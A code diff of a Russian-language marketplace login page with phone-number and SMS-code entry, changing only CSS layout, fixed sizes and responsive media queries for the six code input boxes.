@@ -2,12 +2,21 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Вход - Маркетплейс</title>
     <style>
         :root { --main-purple: #a832ff; --bg-gray: #f4f4f6; --text-gray: #8e8e93; }
-        * { box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 0; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
 
         .app-container {
             width: 100%;
@@ -15,7 +24,7 @@
             min-height: 100vh;
             background: white;
             position: relative;
-            padding: 60px 16px 20px;
+            padding: 60px 20px 30px;
             box-sizing: border-box;
             display: flex;
             flex-direction: column;
@@ -26,8 +35,8 @@
         .top-bar {
             position: absolute;
             top: 20px;
-            left: 16px;
-            right: 16px;
+            left: 20px;
+            right: 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -63,7 +72,7 @@
         }
 
         h2 {
-            font-size: clamp(20px, 5vw, 24px);
+            font-size: 24px;
             text-align: center;
             margin: 30px 0 25px;
             font-weight: 700;
@@ -80,7 +89,7 @@
         .phone-field input {
             background: none;
             border: none;
-            font-size: clamp(16px, 4vw, 18px);
+            font-size: 18px;
             width: 100%;
             outline: none;
             margin-left: 8px;
@@ -130,27 +139,35 @@
             text-align: center;
             color: #333;
             font-size: 15px;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
             line-height: 1.4;
         }
 
-        /* АДАПТИВНЫЕ ПОЛЯ ВВОДА СМС */
+        /* ФИКСИРОВАННЫЕ ПОЛЯ ВВОДА СМС */
+        .sms-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+            width: 100%;
+        }
+
         .sms-grid {
             display: flex;
             justify-content: center;
-            gap: clamp(4px, 2vw, 10px);
-            margin-bottom: 30px;
-            padding: 0 4px;
+            align-items: center;
+            gap: 8px;
+            max-width: 100%;
+            flex-wrap: nowrap;
         }
 
         .sms-box {
-            flex: 1;
-            max-width: 55px;
-            aspect-ratio: 0.85;
+            width: 45px;
+            height: 50px;
             background: var(--bg-gray);
             border: 2px solid transparent;
             border-radius: 12px;
-            font-size: clamp(18px, 5vw, 24px);
+            font-size: 22px;
             font-weight: 500;
             text-align: center;
             outline: none;
@@ -159,21 +176,36 @@
             padding: 0;
             -webkit-appearance: none;
             -moz-appearance: textfield;
+            flex-shrink: 0;
         }
 
-        /* Адаптация для разных экранов */
-        @media (min-width: 400px) {
-            .sms-box { max-width: 50px; }
+        /* Адаптация для маленьких экранов */
+        @media (max-width: 380px) {
+            .sms-box {
+                width: 40px;
+                height: 45px;
+                font-size: 20px;
+            }
+            .sms-grid { gap: 6px; }
         }
 
-        @media (max-width: 360px) {
-            .sms-box { max-width: 45px; font-size: 18px; }
+        @media (max-width: 350px) {
+            .sms-box {
+                width: 36px;
+                height: 42px;
+                font-size: 18px;
+            }
             .sms-grid { gap: 5px; }
         }
 
         @media (max-width: 320px) {
-            .sms-box { max-width: 40px; font-size: 16px; }
+            .sms-box {
+                width: 32px;
+                height: 38px;
+                font-size: 16px;
+            }
             .sms-grid { gap: 4px; }
+            .app-container { padding-left: 15px; padding-right: 15px; }
         }
 
         /* Фиолетовая рамка при фокусе */
@@ -221,7 +253,7 @@
         <h2>Войти или создать профиль</h2>
         <div class="phone-field">
             <div class="flag-icon"></div>
-            <span style="margin-left:8px; font-size:clamp(16px, 4vw, 18px); font-weight: 500;">+7</span>
+            <span style="margin-left:8px; font-size:18px; font-weight: 500;">+7</span>
             <input type="tel" id="phone-input" placeholder="000 000-00-00" maxlength="13" inputmode="numeric">
         </div>
         <button class="primary-btn" onclick="goToLoader()">Получить код</button>
@@ -264,14 +296,19 @@
         <div class="sms-info-text">
             Отправили на <span id="target-phone" style="font-weight:600;"></span>
         </div>
-        <div class="sms-grid" id="sms-inputs">
-            <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-            <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-            <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-            <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-            <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-            <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+
+        <!-- Оборачиваем в wrapper для центрирования -->
+        <div class="sms-wrapper">
+            <div class="sms-grid" id="sms-inputs">
+                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            </div>
         </div>
+
         <div class="timer-text">
             Запросить новый код через <span id="timer">00:58</span>
         </div>
